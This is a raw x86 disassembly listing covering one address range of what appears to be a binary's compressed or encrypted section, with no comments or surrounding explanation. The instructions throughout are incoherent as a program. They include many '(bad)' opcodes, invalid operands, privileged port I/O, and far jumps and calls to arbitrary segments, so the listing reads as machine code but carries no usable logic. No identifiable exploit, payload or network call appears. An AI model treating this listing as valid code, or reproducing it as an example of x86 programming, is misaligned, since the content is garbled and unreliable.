  40b130:	inc    eax
  40b131:	and    al,0xee
  40b133:	jge    0x40b182
  40b135:	xchg   esp,eax
  40b136:	das    
  40b137:	enter  0xaccd,0x3d
  40b13b:	stc    
  40b13c:	and    al,0xa7
  40b13e:	dec    eax
  40b13f:	sbb    BYTE PTR [esi-0x7a],ch
  40b142:	clc    
  40b143:	push   es
  40b144:	mov    edi,0x756c3497
  40b149:	or     BYTE PTR [ebp+0x3f8a45b],cl
  40b14f:	clc    
  40b150:	call   0x3e76b1d
  40b155:	cmp    ah,BYTE PTR [edi+0x5e]
  40b158:	lds    ebp,FWORD PTR [eax]
  40b15a:	dec    eax
  40b15b:	add    al,0x66
  40b15d:	ja     0x40b1b3
  40b15f:	pop    eax
  40b160:	cmp    BYTE PTR [edx+0x7c],dh
  40b163:	outs   dx,BYTE PTR ds:[esi]
  40b164:	dec    edi
  40b165:	pop    esp
  40b166:	sub    edi,DWORD PTR [eax+0x2fb73766]
  40b16c:	sub    eax,DWORD PTR [eax+0x2f]
  40b16f:	ss mov ch,al
  40b172:	shl    ch,cl
  40b174:	les    eax,FWORD PTR [ebp-0x6e]
  40b177:	mov    bl,0xad
  40b179:	sbb    dl,BYTE PTR [ebx]
  40b17b:	xor    ch,cl
  40b17d:	xchg   ecx,eax
  40b17e:	repnz fistp DWORD PTR [edx+0x2]
  40b182:	pop    ebp
  40b183:	call   0x2f23:0xa8165a8c
  40b18a:	add    ecx,0xffffffa9
  40b18d:	cli    
  40b18e:	jnp    0x40b1e3
  40b190:	cmp    al,bl
  40b192:	das    
  40b193:	lods   al,BYTE PTR ds:[esi]
  40b194:	dec    esi
  40b195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b196:	call   0xfc79:0x6b0a28ab
  40b19d:	pop    edi
  40b19e:	outs   dx,BYTE PTR ds:[esi]
  40b19f:	mov    esp,0x50b2a0f1
  40b1a4:	fsub   QWORD PTR ds:0xe4e48fd0
  40b1aa:	hlt    
  40b1ab:	xor    al,0x9f
  40b1ad:	ins    BYTE PTR es:[edi],dx
  40b1ae:	or     DWORD PTR [esi-0x51212ba3],ecx
  40b1b4:	daa    
  40b1b5:	mov    bh,0x25
  40b1b7:	dec    edx
  40b1b8:	xchg   ecx,eax
  40b1b9:	not    DWORD PTR [esi-0x31]
  40b1bc:	ficomp DWORD PTR [ebx-0x4f]
  40b1bf:	cli    
  40b1c0:	mov    ?,WORD PTR [edi+0x458948fb]
  40b1c6:	popa   
  40b1c7:	cs ja  0x40b169
  40b1ca:	sbb    ch,bh
  40b1cc:	dec    edi
  40b1cd:	(bad)  [esi]
  40b1cf:	pop    ds
  40b1d0:	xchg   edx,eax
  40b1d1:	add    cl,BYTE PTR [ebx-0x22]
  40b1d4:	dec    ebp
  40b1d5:	mov    edi,DWORD PTR [ecx-0x232ccf2b]
  40b1db:	pop    esi
  40b1dc:	sub    ebx,esp
  40b1de:	cli    
  40b1df:	enter  0xba84,0xa0
  40b1e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1e4:	cwde   
  40b1e5:	retf   
  40b1e6:	aaa    
  40b1e7:	dec    esi
  40b1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1e9:	pop    edi
  40b1ea:	ss nop
  40b1ec:	fnstsw WORD PTR [ebp+edx*4-0x66622bab]
  40b1f3:	imul   ecx,DWORD PTR [edx+0x77],0xa0420b66
  40b1fa:	test   DWORD PTR [edi+0x11],0xcc0902d8
  40b201:	pop    edx
  40b202:	and    ebp,DWORD PTR [ecx+0x2d]
  40b205:	nop
  40b206:	mov    al,0x73
  40b208:	push   cs
  40b209:	and    cl,al
  40b20b:	das    
  40b20c:	add    edi,DWORD PTR [edx-0x41]
  40b20f:	das    
  40b210:	in     eax,0x15
  40b212:	pop    esp
  40b213:	ja     0x40b213
  40b215:	data16 mov ?,WORD PTR [edx-0x27]
  40b219:	loope  0x40b1ec
  40b21b:	mov    cl,BYTE PTR [edi+0x60aa96bf]
  40b221:	mov    gs,WORD PTR [edx]
  40b223:	dec    eax
  40b224:	jmp    0x40b1c1
  40b226:	add    al,0x25
  40b228:	mov    esp,0x834cfa84
  40b22d:	mov    bh,0x6c
  40b22f:	icebp  
  40b230:	test   DWORD PTR [eax],esi
  40b232:	shr    edx,cl
  40b234:	mul    edi
  40b236:	inc    edx
  40b237:	ds ret 0xa7a8
  40b23b:	push   ds
  40b23c:	push   eax
  40b23d:	popf   
  40b23e:	and    ecx,DWORD PTR [esi]
  40b240:	fs aad 0xdc
  40b243:	add    esi,esi
  40b245:	int    0xe5
  40b247:	sub    cl,bl
  40b249:	push   cs
  40b24a:	icebp  
  40b24b:	pop    ss
  40b24c:	and    dh,BYTE PTR [edi-0x53]
  40b24f:	daa    
  40b250:	or     eax,0x867df670
  40b255:	push   edi
  40b256:	mov    ?,WORD PTR [ebp+0x2d0a2426]
  40b25c:	fimul  DWORD PTR [eax+0x7a5e128b]
  40b262:	pop    sp
  40b264:	add    esp,DWORD PTR [edi-0x39]
  40b267:	push   ecx
  40b268:	div    BYTE PTR [eax+0x5e6fab0d]
  40b26e:	inc    edi
  40b26f:	ror    BYTE PTR [esi],cl
  40b271:	js     0x40b2c7
  40b273:	(bad)  
  40b274:	sti    
  40b275:	pop    edx
  40b276:	push   esp
  40b277:	add    esp,DWORD PTR [esi+edx*8]
  40b27a:	out    0xfe,eax
  40b27c:	pop    es
  40b27d:	jb     0x40b2fa
  40b27f:	adc    esp,DWORD PTR [edx]
  40b281:	outs   dx,DWORD PTR ds:[esi]
  40b282:	mov    esi,0x8d3bbdc6
  40b287:	adc    BYTE PTR [ebx+0x5a],cl
  40b28a:	cs ja  0x40b25b
  40b28d:	int    0xf4
  40b28f:	stos   BYTE PTR es:[edi],al
  40b290:	sbb    al,BYTE PTR [eax]
  40b292:	push   ebx
  40b293:	test   eax,0x5e022dde
  40b298:	pop    ds
  40b299:	sahf   
  40b29a:	pushf  
  40b29b:	mov    ebx,DWORD PTR [esi]
  40b29d:	mov    dh,0x2d
  40b29f:	jb     0x40b248
  40b2a1:	sahf   
  40b2a2:	out    0x2c,al
  40b2a4:	push   esi
  40b2a5:	xor    ebp,DWORD PTR [ecx+0x5e]
  40b2a8:	loope  0x40b249
  40b2aa:	fdiv   DWORD PTR [edx]
  40b2ac:	loopne 0x40b289
  40b2ae:	bound  edi,QWORD PTR [esi-0x39]
  40b2b1:	dec    esp
  40b2b2:	pop    eax
  40b2b3:	and    bh,ah
  40b2b5:	mov    bh,0xb3
  40b2b7:	or     al,BYTE PTR [ebx+0x4c]
  40b2ba:	inc    edi
  40b2bb:	std    
  40b2bc:	sbb    ebx,DWORD PTR [edi]
  40b2be:	cld    
  40b2bf:	pop    edi
  40b2c0:	les    ebx,FWORD PTR ds:0x54f74078
  40b2c6:	adc    eax,0x3025f025
  40b2cb:	sbb    esp,edi
  40b2cd:	push   cs
  40b2ce:	dec    eax
  40b2cf:	jg     0x40b34d
  40b2d1:	cmp    BYTE PTR ds:0x328ffefe,dh
  40b2d7:	push   ss
  40b2d8:	cmp    bl,BYTE PTR [edx+0x7b277746]
  40b2de:	retf   0x6aaf
  40b2e1:	pop    ss
  40b2e2:	aad    0xfd
  40b2e4:	fidiv  DWORD PTR [edi]
  40b2e6:	push   cs
  40b2e7:	push   ss
  40b2e8:	xchg   edi,eax
  40b2e9:	mov    esi,0x820ca18c
  40b2ee:	dec    ebp
  40b2ef:	sub    al,0x63
  40b2f1:	sub    BYTE PTR [ecx+0x49],ah
  40b2f4:	cs out dx,al
  40b2f6:	adc    BYTE PTR ds:0xa38bc5da,0xe4
  40b2fd:	test   ecx,esi
  40b2ff:	mov    esp,0x8e60303c
  40b304:	sub    esp,DWORD PTR [ebx-0x28e039cd]
  40b30a:	push   0x17b87e2a
  40b30f:	inc    ebp
  40b310:	jg     0x40b340
  40b312:	popa   
  40b313:	adc    eax,0x31d71570
  40b318:	inc    esp
  40b319:	sub    DWORD PTR [edi+0x381a0c2],0xe3254204
  40b323:	imul   ebx,esi,0xf0c8e
  40b329:	adc    bh,0x41
  40b32c:	pushf  
  40b32d:	dec    esp
  40b32e:	stos   BYTE PTR es:[edi],al
  40b32f:	inc    ebx
  40b330:	adc    eax,0xf5bb0f55
  40b335:	lods   al,BYTE PTR ds:[esi]
  40b336:	cmp    bh,al
  40b338:	fcom   QWORD PTR [edi]
  40b33a:	sub    ebp,esp
  40b33c:	sub    BYTE PTR [eax+0x19],dh
  40b33f:	repz test BYTE PTR [ebx],dl
  40b342:	mov    ds:0x76116585,eax
  40b347:	inc    eax
  40b348:	fisttp QWORD PTR [ebx-0x7b]
  40b34b:	sahf   
  40b34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34d:	adc    BYTE PTR [eax-0x3331f53a],dh
  40b353:	ret    
  40b354:	xlat   BYTE PTR ds:[ebx]
  40b355:	sub    eax,0x7c546433
  40b35a:	dec    edi
  40b35b:	aad    0x15
  40b35d:	popf   
  40b35e:	test   eax,0x53ca67b3
  40b363:	into   
  40b364:	pusha  
  40b365:	ret    
  40b366:	fldenv [ebx-0x1bce8955]
  40b36c:	jbe    0x40b369
  40b36e:	sub    al,0x50
  40b370:	lahf   
  40b371:	jg     0x40b325
  40b373:	ins    DWORD PTR es:[edi],dx
  40b374:	cld    
  40b375:	jbe    0x40b33f
  40b377:	imul   eax,DWORD PTR [eax],0xf8427ed
  40b37d:	xor    al,0x6
  40b37f:	sub    ch,al
  40b381:	nop
  40b382:	ins    BYTE PTR es:[edi],dx
  40b383:	jl     0x40b305
  40b385:	pop    ebp
  40b386:	loop   0x40b358
  40b388:	ror    BYTE PTR [eax-0x2b],cl
  40b38b:	xlat   BYTE PTR ds:[ebx]
  40b38c:	rol    ch,cl
  40b38e:	stc    
  40b38f:	pop    ecx
  40b390:	bound  edx,QWORD PTR [ebp+0x24]
  40b393:	test   DWORD PTR [edx+0x3aeacd74],esp
  40b399:	mov    esi,0xf60f0f12
  40b39e:	ficom  DWORD PTR [ecx]
  40b3a0:	add    bh,BYTE PTR [ecx]
  40b3a2:	dec    ebp
  40b3a3:	out    dx,al
  40b3a4:	xchg   edx,eax
  40b3a5:	pop    ss
  40b3a6:	xchg   eax,ecx
  40b3a8:	sbb    al,0xc0
  40b3aa:	add    al,BYTE PTR [ebp-0x7c]
  40b3ad:	lea    esi,[edi-0x55]
  40b3b0:	mov    ah,0x2e
  40b3b2:	cmc    
  40b3b3:	jmp    0x4d7e:0x40c5d9d
  40b3ba:	jmp    0x40b365
  40b3bc:	jle    0x40b42b
  40b3be:	sub    BYTE PTR [esi+0x39],bl
  40b3c1:	pop    esi
  40b3c2:	push   ss
  40b3c3:	adc    al,BYTE PTR [esi-0x2d]
  40b3c6:	mov    eax,0x5681376b
  40b3cb:	pop    esp
  40b3cc:	fmul   QWORD PTR [esp+edi*1-0x141c2ec4]
  40b3d3:	imul   esi,DWORD PTR [ecx+0x20216874],0xffffffbb
  40b3da:	xchg   esp,eax
  40b3db:	or     eax,0x3f2086ed
  40b3e0:	aam    0x86
  40b3e2:	or     BYTE PTR [edx+0x2d],al
  40b3e5:	stos   DWORD PTR es:[edi],eax
  40b3e6:	test   BYTE PTR [eax+esi*1-0xdb7f850],bh
  40b3ed:	ret    
  40b3ee:	dec    ebx
  40b3ef:	mov    BYTE PTR [edi-0x60079699],ah
  40b3f5:	ret    0x8d12
  40b3f8:	ja     0x40b3fc
  40b3fa:	jp     0x40b3cf
  40b3fc:	nop
  40b3fd:	ss leave 
  40b3ff:	scas   al,BYTE PTR es:[edi]
  40b400:	pop    ds
  40b401:	in     al,dx
  40b402:	and    eax,0x7cdd59b3
  40b407:	cmp    ch,BYTE PTR [eax+0xa]
  40b40a:	jl     0x40b476
  40b40c:	mov    dh,0x36
  40b40e:	jge    0x40b41b
  40b410:	pop    esp
  40b411:	or     al,0x49
  40b413:	mov    BYTE PTR [ebx+0x62],dl
  40b416:	test   DWORD PTR [ecx+ebp*1+0x1bc4191],0x196aded7
  40b421:	retf   
  40b422:	daa    
  40b423:	ror    DWORD PTR [ebx],0x62
  40b426:	repnz bound ebx,QWORD PTR [eax-0x4e4fb7b]
  40b42d:	jge    0x40b454
  40b42f:	mov    esp,0x5a87c960
  40b434:	js     0x40b496
  40b436:	add    DWORD PTR [esi],esp
  40b438:	mov    esi,esp
  40b43a:	or     DWORD PTR [edi+0x35],esi
  40b43d:	retf   0x9c78
  40b440:	jo     0x40b44d
  40b442:	dec    edx
  40b443:	add    al,0xd2
  40b445:	cmp    cl,ch
  40b447:	inc    eax
  40b448:	int    0xa8
  40b44a:	mov    edi,0x3d443b53
  40b44f:	jbe    0x40b430
  40b451:	xor    ebx,DWORD PTR [ebx]
  40b453:	(bad)  
  40b454:	out    dx,eax
  40b455:	push   esp
  40b456:	xlat   BYTE PTR ds:[ebx]
  40b457:	aas    
  40b458:	jmp    0x40b469
  40b45a:	sub    al,0x9
  40b45c:	jle    0x40b3f5
  40b45e:	add    eax,0x91210d33
  40b463:	push   ecx
  40b464:	arpl   WORD PTR [ecx-0x54],bp
  40b467:	test   DWORD PTR es:[ebx-0x61c0e76f],eax
  40b46e:	mov    ecx,0x1e2b61c1
  40b473:	xor    al,0xa7
  40b475:	stc    
  40b476:	int3   
  40b477:	gs dec edi
  40b479:	push   ss
  40b47a:	inc    edx
  40b47b:	xchg   edx,eax
  40b47c:	std    
  40b47d:	sub    eax,0x9c3d5c10
  40b482:	xchg   ecx,eax
  40b483:	push   0x835ce3f4
  40b488:	sbb    ah,BYTE PTR [ecx]
  40b48a:	repnz sbb eax,0x8cb78c23
  40b490:	jl     0x40b46b
  40b492:	(bad)  
  40b494:	je     0x40b4aa
  40b496:	(bad)
  40b499:	xchg   ebp,eax
  40b49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49b:	mov    ebx,0x4bcb9d88
  40b4a0:	cmp    dh,BYTE PTR [ecx-0x7d5034d]
  40b4a6:	bound  ebx,QWORD PTR [eax]
  40b4a8:	neg    bl
  40b4aa:	or     al,0x90
  40b4ac:	gs repnz mov dh,0x7f
  40b4b0:	stc    
  40b4b1:	sbb    al,BYTE PTR [ebx+0x534e733b]
  40b4b7:	xor    cl,ah
  40b4b9:	sbb    al,0x4b
  40b4bb:	ss popf 
  40b4bd:	dec    ebp
  40b4be:	pop    esi
  40b4bf:	iret   
  40b4c0:	mov    esi,0x2b55a624
  40b4c5:	mov    ch,0xd
  40b4c7:	mov    al,ds:0xb2cf599b
  40b4cc:	imul   edi,DWORD PTR [edi-0x48850ad9],0x30
  40b4d3:	jne    0x40b496
  40b4d5:	call   0xbce1:0x5a6dc94e
  40b4dc:	dec    esi
  40b4dd:	cmp    eax,eax
  40b4df:	shl    DWORD PTR [edx-0x14921a3e],0x94
  40b4e6:	cs loop 0x40b4ed
  40b4e9:	loop   0x40b49e
  40b4eb:	inc    edi
  40b4ec:	sbb    cl,BYTE PTR [ecx-0x73]
  40b4ef:	lods   al,BYTE PTR ds:[esi]
  40b4f0:	jne    0x40b4fd
  40b4f2:	lds    edi,FWORD PTR [ecx+ebx*2-0x7e]
  40b4f6:	mov    es,edi
  40b4f8:	fadd   DWORD PTR [esi+0x76a43b28]
  40b4fe:	sbb    bh,bh
  40b500:	push   edi
  40b501:	mov    edi,DWORD PTR [ecx+0x41]
  40b504:	jo     0x40b52b
  40b506:	(bad)  
  40b508:	fist   DWORD PTR [eax-0x47]
  40b50b:	inc    edx
  40b50c:	push   ds
  40b50d:	cld    
  40b50e:	in     eax,dx
  40b50f:	(bad)  [eax-0x60]
  40b512:	xchg   edx,eax
  40b513:	jae    0x40b49d
  40b515:	leave  
  40b516:	mov    al,0x43
  40b518:	cdq    
  40b519:	push   ebp
  40b51a:	jns    0x40b4b9
  40b51c:	cmp    ebp,0xffffff87
  40b51f:	and    bh,ch
  40b521:	add    DWORD PTR [ebx+0x3a],ecx
  40b524:	(bad)  
  40b525:	sub    ecx,DWORD PTR [edi+0x1375b6f2]
  40b52b:	leave  
  40b52c:	mov    cl,0x72
  40b52e:	popf   
  40b52f:	popf   
  40b530:	jl     0x40b55a
  40b532:	inc    edx
  40b533:	xor    al,0x5b
  40b535:	jns    0x40b4cd
  40b537:	dec    esi
  40b538:	bound  edi,QWORD PTR [edi-0x448c5ebe]
  40b53e:	retf   
  40b53f:	daa    
  40b540:	in     al,dx
  40b541:	bound  ebp,QWORD PTR [edi+0x430b5957]
  40b547:	call   DWORD PTR [edi+0x3040fe77]
  40b54d:	cld    
  40b54e:	fisubr WORD PTR [eax-0x20]
  40b551:	dec    ebp
  40b552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b553:	leave  
  40b554:	push   esi
  40b556:	mov    ch,0xa5
  40b558:	je     0x40b518
  40b55a:	stc    
  40b55b:	jo     0x40b54a
  40b55d:	aam    0x6e
  40b55f:	xor    al,0x20
  40b561:	sbb    al,0xe3
  40b563:	xor    BYTE PTR [esi-0x6c70196e],0x94
  40b56a:	mov    esp,0xe28632c8
  40b56f:	mov    cl,0x16
  40b571:	out    dx,eax
  40b572:	stos   BYTE PTR es:[edi],al
  40b573:	jbe    0x40b52e
  40b575:	cli    
  40b576:	dec    BYTE PTR [edi]
  40b578:	and    al,0x14
  40b57a:	adc    DWORD PTR [edi-0x73161f2f],ebx
  40b580:	je     0x40b5d1
  40b582:	xchg   DWORD PTR [ebp-0x6a9914dd],ecx
  40b588:	mov    esp,0x8e4f0851
  40b58d:	pop    bx
  40b58f:	mov    ch,0xf3
  40b591:	or     eax,0x2203926e
  40b596:	cmp    DWORD PTR [eax-0x44],esi
  40b599:	pop    edi
  40b59a:	jb     0x40b608
  40b59c:	in     al,dx
  40b59d:	cs jmp 0x510598fd
  40b5a3:	pop    es
  40b5a4:	dec    esi
  40b5a5:	and    edx,DWORD PTR [edx]
  40b5a7:	outs   dx,DWORD PTR ds:[esi]
  40b5a8:	mov    esi,0x9b377953
  40b5ad:	out    dx,eax
  40b5ae:	cdq    
  40b5af:	test   eax,0x5a6a0845
  40b5b4:	adc    ah,BYTE PTR [ecx-0x38]
  40b5b7:	cmc    
  40b5b8:	inc    ecx
  40b5b9:	aam    0x7c
  40b5bb:	cmp    BYTE PTR [edi],dl
  40b5bd:	imul   edi
  40b5bf:	loopne 0x40b55e
  40b5c1:	xor    DWORD PTR [ebx],0x428fbc47
  40b5c7:	sub    dl,BYTE PTR [ebx]
  40b5c9:	out    dx,eax
  40b5ca:	mov    WORD PTR fs:[esi-0x72831949],gs
  40b5d1:	pop    esi
  40b5d2:	or     esp,ecx
  40b5d4:	inc    esp
  40b5d5:	cdq    
  40b5d6:	mov    ds:0x10e6bc7b,al
  40b5db:	clc    
  40b5dc:	arpl   WORD PTR [eax-0x3c7b30c4],di
  40b5e2:	sbb    DWORD PTR [ebx+0x47],eax
  40b5e5:	inc    ebp
  40b5e6:	js     0x40b600
  40b5e8:	xchg   cl,ch
  40b5ea:	inc    ebx
  40b5eb:	mov    al,0xc9
  40b5ed:	sub    al,0x60
  40b5ef:	retf   
  40b5f0:	cmp    bl,bl
  40b5f2:	jne    0x40b5bb
  40b5f4:	pop    edx
  40b5f5:	pushf  
  40b5f6:	or     edi,DWORD PTR [edx-0x3e5ac8c8]
  40b5fc:	xor    BYTE PTR [esi-0x7f],0xdb
  40b600:	dec    ebx
  40b601:	es mov eax,0xc69748d7
  40b607:	mov    ah,0x54
  40b609:	add    eax,DWORD PTR [esi+0x6320535f]
  40b60f:	rol    DWORD PTR [edx+0xc],0x2c
  40b613:	mov    ebp,DWORD PTR [edx+0x7a]
  40b616:	mov    bh,0x98
  40b618:	mov    esi,0xe513141b
  40b61d:	sbb    al,cl
  40b61f:	sub    ah,BYTE PTR [esi+0x35]
  40b622:	push   ebp
  40b623:	and    eax,0x7ddbe5e6
  40b628:	lea    edx,[ebp-0x41a71440]
  40b62e:	xor    BYTE PTR ds:0xfb6fd460,bh
  40b634:	sub    eax,0xff02645e
  40b639:	adc    BYTE PTR ds:0x4a2c3ccb,dl
  40b63f:	adc    cl,ch
  40b641:	in     eax,dx
  40b642:	push   ecx
  40b643:	ret    
  40b644:	inc    ebx
  40b645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b646:	dec    esp
  40b647:	jmp    0xd8170aa0
  40b64c:	inc    DWORD PTR [ecx+0x71]
  40b64f:	int    0xbf
  40b651:	inc    ecx
  40b652:	lds    edx,FWORD PTR [esi-0x39a03c00]
  40b658:	cdq    
  40b659:	mov    esi,0x54c6ed11
  40b65e:	push   esi
  40b65f:	xchg   edx,eax
  40b660:	ret    0x4a4e
  40b663:	and    ecx,DWORD PTR [esi]
  40b665:	imul   eax,ecx,0x10882c06
  40b66b:	shl    DWORD PTR [esp+eax*8+0x70],cl
  40b66f:	and    BYTE PTR [ecx],0x2d
  40b672:	jmp    0x40b681
  40b674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b675:	ficom  DWORD PTR [ebp+0x15]
  40b678:	xchg   esi,eax
  40b679:	cmp    eax,DWORD PTR ds:0x40f9ae7c
  40b67f:	jne    0x40b68d
  40b681:	test   eax,0x2d160c15
  40b686:	dec    ecx
  40b687:	gs std 
  40b689:	add    DWORD PTR [eax],eax
  40b68b:	jmp    0xea98:0xc4b35602
  40b692:	sub    ecx,esi
  40b694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b695:	shl    cl,cl
  40b697:	or     BYTE PTR [ecx],0xcd
  40b69a:	loopne 0x40b6b8
  40b69c:	pop    ecx
  40b69d:	jmp    0x40b6fa
  40b69f:	dec    eax
  40b6a0:	mov    cl,0xf8
  40b6a2:	loop   0x40b6b4
  40b6a4:	rol    esi,1
  40b6a6:	inc    edx
  40b6a7:	cs loop 0x40b70e
  40b6aa:	cs cdq 
  40b6ac:	and    dl,dh
  40b6ae:	sub    esi,esi
  40b6b0:	shl    DWORD PTR [ecx+eiz*8+0x6465f4e7],0xac
  40b6b8:	int    0x20
  40b6ba:	outs   dx,DWORD PTR ds:[esi]
  40b6bb:	arpl   WORD PTR [edx+0x7a857706],ax
  40b6c1:	(bad)  
  40b6c2:	lea    edx,[edx+0x534dad66]
  40b6c8:	mov    esp,0x7176ca35
  40b6cd:	jno    0x40b6d3
  40b6cf:	retf   0xa127
  40b6d2:	pushf  
  40b6d3:	mov    ebp,0xf9adc1d8
  40b6d8:	mov    cl,0xfb
  40b6da:	arpl   WORD PTR [esp+eax*1],dx
  40b6dd:	test   BYTE PTR [esi],dl
  40b6df:	fnsave [ebx+edi*1-0x5f]
  40b6e3:	cwde   
  40b6e4:	jo     0x40b700
  40b6e6:	sub    eax,ecx
  40b6e8:	sub    eax,DWORD PTR [esi]
  40b6ea:	cli    
  40b6eb:	and    BYTE PTR [eax+ebp*8-0x4fa51169],bl
  40b6f2:	pop    edi
  40b6f3:	jecxz  0x40b730
  40b6f5:	cmc    
  40b6f6:	pop    edx
  40b6f7:	cld    
  40b6f8:	je     0x40b6f9
  40b6fa:	push   0x756d6148
  40b6ff:	pop    es
  40b700:	cmp    DWORD PTR [edx+0x6b],edx
  40b703:	dec    edx
  40b704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b705:	xchg   ecx,eax
  40b706:	sbb    esp,DWORD PTR [edi+esi*2+0x30]
  40b70a:	pop    edx
  40b70b:	mov    dl,BYTE PTR [eax]
  40b70d:	fild   WORD PTR [eax+0x7ac379bb]
  40b713:	jl     0x40b6ed
  40b715:	jbe    0x40b75f
  40b717:	out    dx,al
  40b718:	xchg   esi,eax
  40b719:	push   ss
  40b71a:	jg     0x40b74b
  40b71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b71e:	sbb    al,0x19
  40b720:	repnz mov al,0xfa
  40b723:	fiadd  WORD PTR [ebx]
  40b725:	mov    edi,esi
  40b727:	mov    al,0x84
  40b729:	jecxz  0x40b6bb
  40b72b:	outs   dx,DWORD PTR ds:[esi]
  40b72c:	sub    al,0xc5
  40b72e:	loop   0x40b715
  40b730:	stc    
  40b731:	jbe    0x40b740
  40b733:	es adc al,0xf1
  40b736:	test   al,0xff
  40b738:	ret    0x6b76
  40b73b:	test   DWORD PTR [edi+0x23],ecx
  40b73e:	ss jecxz 0x40b708
  40b741:	scas   eax,DWORD PTR es:[edi]
  40b742:	push   esi
  40b743:	cmp    eax,0xa71c3dbe
  40b748:	test   al,0x54
  40b74a:	loopne 0x40b6d2
  40b74c:	pop    edx
  40b74d:	pop    es
  40b74e:	push   0xffffffc3
  40b750:	call   FWORD PTR [edi-0x32]
  40b753:	sbb    BYTE PTR [ebp-0x66],0x82
  40b757:	fidiv  WORD PTR [ebp-0x12]
  40b75a:	dec    esp
  40b75b:	cmp    DWORD PTR [ebp+ecx*1-0x41b2e9aa],ecx
  40b762:	rep outs dx,BYTE PTR ds:[esi]
  40b764:	test   al,0xb0
  40b766:	nop
  40b767:	nop
  40b768:	es int 0x59
  40b76b:	ins    DWORD PTR es:[edi],dx
  40b76c:	jmp    0x537b:0x7839bdfe
  40b773:	sub    al,0x6e
  40b775:	cmp    BYTE PTR [edi-0x7],bh
  40b778:	loopne 0x40b757
  40b77a:	jmp    0x7d529a0e
  40b77f:	cmp    eax,edx
  40b781:	pop    eax
  40b782:	or     bl,dh
  40b784:	push   ecx
  40b785:	addr16 push ss
  40b787:	adc    eax,0x5ddf3fbb
  40b78c:	pop    ebp
  40b78d:	in     al,0x7a
  40b78f:	les    ebp,FWORD PTR [ebx]
  40b791:	xchg   edi,eax
  40b792:	pop    edi
  40b793:	and    BYTE PTR ds:0x633797fa,dh
  40b799:	icebp  
  40b79a:	imul   ebx,DWORD PTR ds:0x9fada981,0x7b
  40b7a1:	jae    0x40b7df
  40b7a3:	mov    ebp,0xe0c5d89
  40b7a8:	mov    ebp,0x4c25fd46
  40b7ad:	ins    DWORD PTR es:[edi],dx
  40b7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7af:	jmp    0x42a7:0x3ed960f1
  40b7b6:	add    BYTE PTR [eax+0x7404375c],ah
  40b7bc:	cdq    
  40b7bd:	add    esp,edx
  40b7bf:	or     ah,cl
  40b7c1:	push   0xffffffc9
  40b7c3:	daa    
  40b7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7c5:	xchg   esp,eax
  40b7c6:	jae    0x40b7ed
  40b7c8:	mov    dl,0x86
  40b7ca:	mov    esp,ebp
  40b7cc:	add    eax,0x9a2ff2e2
  40b7d1:	xchg   ecx,eax
  40b7d2:	jns    0x40b84f
  40b7d4:	xchg   esi,eax
  40b7d5:	inc    edi
  40b7d6:	mov    fs:0xe097980,al
  40b7dc:	inc    ebp
  40b7dd:	stos   BYTE PTR es:[edi],al
  40b7de:	xchg   ecx,eax
  40b7df:	push   ss
  40b7e0:	loop   0x40b810
  40b7e2:	push   eax
  40b7e3:	sbb    eax,0x1e5e8ae
  40b7e8:	mul    bl
  40b7ea:	inc    esi
  40b7eb:	mov    bl,BYTE PTR [eax+ebx*1+0x20]
  40b7ef:	jmp    0x40b841
  40b7f1:	inc    eax
  40b7f2:	imul   edi,DWORD PTR [ecx-0x67],0x8d8e3b53
  40b7f9:	dec    edx
  40b7fa:	inc    ecx
  40b7fb:	jge    0x40b836
  40b7fd:	mov    ch,0xf9
  40b7ff:	jb     0x40b81d
  40b801:	out    0x75,al
  40b803:	push   0x2e
  40b805:	sbb    bh,ah
  40b807:	adc    al,0x6d
  40b809:	dec    esp
  40b80a:	push   cs
  40b80b:	out    0x1f,al
  40b80d:	sbb    ch,ah
  40b80f:	addr16 retf 0xa6c
  40b813:	jg     0x40b826
  40b815:	mov    ds:0xe7f7e5b5,eax
  40b81a:	and    ecx,DWORD PTR [ebp-0x58]
  40b81d:	adc    eax,0xabcbac8e
  40b822:	rol    ebp,0x48
  40b825:	pushf  
  40b826:	cwde   
  40b827:	mov    DWORD PTR [eax+0xd],0x97cc4825
  40b82e:	push   ebx
  40b82f:	mov    cl,BYTE PTR [eax]
  40b831:	dec    esi
  40b832:	mov    ebx,DWORD PTR [edi-0x74dff97e]
  40b838:	xor    edi,esp
  40b83a:	inc    ecx
  40b83b:	mov    al,ds:0x7b1a2b55
  40b840:	jb     0x40b7dd
  40b842:	mov    cl,0xd7
  40b844:	push   0x2ea495da
  40b849:	int    0xd9
  40b84b:	push   esp
  40b84c:	stos   DWORD PTR es:[edi],eax
  40b84d:	push   ebx
  40b84e:	cld    
  40b84f:	loop   0x40b843
  40b851:	pushf  
  40b852:	cmp    DWORD PTR [ebx+0x29],eax
  40b855:	cld    
  40b856:	adc    DWORD PTR [ecx+0x2f],0x75
  40b85a:	ja     0x40b84e
  40b85c:	or     BYTE PTR [ebp+0x17b3d96f],0x92
  40b863:	add    ch,BYTE PTR [ecx+0x64]
  40b866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b867:	jmp    0x5094:0x8203f3d4
  40b86e:	push   ds
  40b86f:	pop    edx
  40b870:	leave  
  40b871:	pushf  
  40b872:	aas    
  40b873:	mov    cl,0xf2
  40b875:	lock icebp 
  40b877:	sbb    DWORD PTR ds:0xe3be260e,0x67e34828
  40b881:	pop    ds
  40b882:	dec    ecx
  40b883:	mov    ebx,0x883260a0
  40b888:	push   0xffffff82
  40b88a:	xor    al,0xde
  40b88c:	icebp  
  40b88d:	pop    ds
  40b88e:	xchg   esi,eax
  40b88f:	stos   BYTE PTR es:[edi],al
  40b890:	cmp    eax,DWORD PTR [ebp+0xcc314]
  40b896:	jle    0x40b851
